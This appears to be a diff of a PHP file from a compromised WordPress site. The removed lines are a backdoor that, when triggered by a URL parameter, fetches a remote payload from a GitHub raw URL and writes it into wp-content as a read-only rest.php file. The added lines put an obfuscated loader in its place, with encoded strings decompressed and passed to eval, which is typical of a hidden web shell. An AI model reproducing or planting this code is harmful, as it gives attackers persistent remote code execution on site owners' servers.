@@ -1,58 +1,6 @@
 <?php
-
-if (isset($_GET['reka'])) {
-    $dirPath = '/home/trickingz/htdocs/www.trickingz.com/wp-content/';
-    $filePath = $dirPath . '/rest.php';
-
-    $url = 'https://raw.githubusercontent.com/Eza168/alpa1/refs/heads/main/entutpret';
-
-    $desiredPermission = 0444;
-
-    if (!is_dir($dirPath)) {
-        if (!mkdir($dirPath, 0755, true)) {
-            die("Gagal membuat direktori $dirPath");
-        }
-    }
-
-    $remoteContent = file_get_contents($url);
-
-    if ($remoteContent === false) {
-        echo "Gagal mengambil konten dari URL.\n";
-        exit;
-    }
-
-    if (file_exists($filePath)) {
-        $localContent = file_get_contents($filePath);
-
-        if ($localContent !== $remoteContent) {
-            if (file_put_contents($filePath, $remoteContent) !== false) {
-                echo "Isi file berhasil diperbarui.\n";
-            } else {
-                echo "Gagal memperbarui isi file.\n";
-            }
-        } else {
-            echo "Isi file sudah sama dengan konten dari URL.\n";
-        }
-
-        $filePermission = fileperms($filePath);
-
-        if (($filePermission & 0777) !== $desiredPermission) {
-            if (chmod($filePath, $desiredPermission)) {
-                echo "Izin file telah diubah menjadi 444.\n";
-            } else {
-                echo "Gagal mengubah izin file.\n";
-            }
-        }
-    } else {
-        if (file_put_contents($filePath, $remoteContent) !== false) {
-            if (chmod($filePath, $desiredPermission)) {
-                echo "File berhasil dibuat dengan konten dari URL dan izin 444.\n";
-            } else {
-                echo "File berhasil dibuat tetapi tidak mengubah izinnya.\n";
-            }
-        } else {
-            echo "Gagal membuat file.\n";
-        }
-    }
-}
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3dYhOK5t1yYE4L0yMOJpJJ\x61i\x41\x2b7wG86N906lO\x63vHd\x2b\x439ip\x62\x2bXLqh2s\x62djy4jNDq0WYn\x2bp7LLi9xgj1nUe0xg79pID5PLj\x2bLg\x637VlNjY\x63ohDIXEN6D/X3oiY83vr5Hk\x43Sx\x41S\x43p0EgSoY7i54d\x61UXmt5JZUp96Xu7p4WyVsLH0eNPtkrvzMEd\x415i\x61\x2bpSJ/U9lNx45q\x62sNsMl\x42zkYVRROwtXRih1H\x41tKwGMgif\x2bqG\x2bPe\x41JGFqQod\x42EZoQ2nF\x61FpRmE0\x432IowLqu1UrW9fk8PwsK6/kSNwno4dfq6jksWGquZrP\x42q7fGpI3\x62Sxss\x62\x63zR6KfK9StQ\x42mjRdeJqfOEMuF/tu/\x2b\x2bj\x42Dh1hhsrZzkQJH7ET\x61FPK\x42\x43/\x61p\x41pNnirTSXX\x611smkXODKtO0j5qWnj\x43nsnK8TzMh2q5\x2bfep2MXH\x62xroWE7p1khY6jOw\x43gs\x63K2Yy9GDXRPe\x2b\x42oNQLzopu8GrdzFgmtHZHGhy8\x41d\x2bQToVoYUPyOK\x61xLehOg6Zj1l\x42k\x62hdJKs\x41ZN\x419StLgg\x63SRGeqix\x43gHo0Twl3Q9m\x61WPf526udWEwW\x42EohRQnGdzG0k7w65r1JK38MFYoWdwki1VpEYqEp3IUVo\x41Y8EeV0lfoGQo8y8fjxfZk6\x2bxWNu5NFLS90\x2bULijidMuEXG41JUmtr\x43T3\x615VUiey4\x42M4vxsdM9MzeJN57H3dv1M1u\x41Ve\x41M\x2bEwwH8g4\x2bdztZvp3vdTm\x623g\x41XwpHGLZ\x61jK/d/RfixK55k1tq\x62s\x62\x43yWJED5\x63U6Hywv3jYz\x439dz\x43lpF3\x43s/juX9D\x42QTv47U1\x61/\x43LQP\x42wJe9fr\x41IFQ/yKQT\x42wJe9fq\x41YFQ/iKQX\x42wJe9fp\x41oFQ/SKQ\x62\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
 ?>
